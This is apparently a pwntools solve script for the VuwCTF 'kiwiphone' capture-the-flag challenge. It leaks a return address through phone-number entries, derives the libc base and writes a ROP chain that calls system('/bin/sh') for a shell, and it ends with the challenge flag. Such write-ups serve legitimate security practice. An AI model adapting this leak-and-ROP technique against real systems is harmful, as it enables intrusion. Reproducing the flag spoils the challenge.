import argparse
import sys, os
sys.path.append(os.environ.get('PWNFAST_PATH'))
from pwn import *
from pwnfast import *

_p = argparse.ArgumentParser()
_p.add_argument('-d', action="store_true")
_p.add_argument('-r', action="store_true")
_p.add_argument('-s', action="store_true")
args = _p.parse_args()

context.terminal = ['tmux', 'new-window']

PROG = './chal'
libc = ELF('./libc.so.6')
host, port = 'kiwiphone-2080c3f3d5620dd2.challenges.2025.vuwctf.com', 9981

def start():
    if args.r:
        return PwnRemote(PROG, host, port, ssl=True)
    elif args.s:
        return PwnSsh(PROG, '', host, port, 'guest')
    else:
        return PwnLocal(PROG, args.d, pie_base=0x555555554000)


### ------------------ EXPLOIT ------------------ ###

r = start()

def enter_index(i):
    r.ru(b'exit:')
    r.sl(str(i).encode())

def enter_num(num):
    r.ru(b'store:')
    r.sl(num)

def enter_pay(addr):
    r.ru(b'store:')
    a = hex(addr)[2:]
    w1 = int(a[0:4], 16)
    w2 = int(a[4:8], 16)
    w3 = int(a[8:12], 16)
    pay = f'+{w3} {w2} {w1}-0'
    r.sl(pay)

enter_index(0)
enter_num(b'+22 0 0-0')

# ret address is in entry 19
r.ru(b'Entry 19: Phone Number: +')
w1 = hex(int(r.ru(b' ')[:-1]))[2:]
w2 = hex(int(r.ru(b' ')[:-1]))[2:]
w3 = hex(int(r.ru(b'-')[:-1]))[2:]
w4 = hex(int(r.rl().strip()))[2:]

ret = int(f'{w4}{w3}{w2}{w1}', 16)
log_leak(ret, 'ret addr')

libc_base = ret - 0x2a1ca
libc.address = libc_base
log_leak(libc_base, 'libc base')

# Start ROP chain
enter_index(19)
pop_rdi = libc_base + 0x001157bc
enter_pay(pop_rdi)

enter_index(20)
enter_pay(next(libc.search('/bin/sh')))

# ret gadget for 16 byte alignment
ret_gadget = libc_base + 0x0013b993 
enter_index(21)
enter_pay(ret_gadget)

enter_index(22)
r.gdb(r.ret('main'))
enter_pay(libc.sym['system'])

enter_index(-1)
r.interactive()
# VuwCTF{c0nv3nient1y_3vil_kiwi_nuMb3r_f0rMatt1nG}
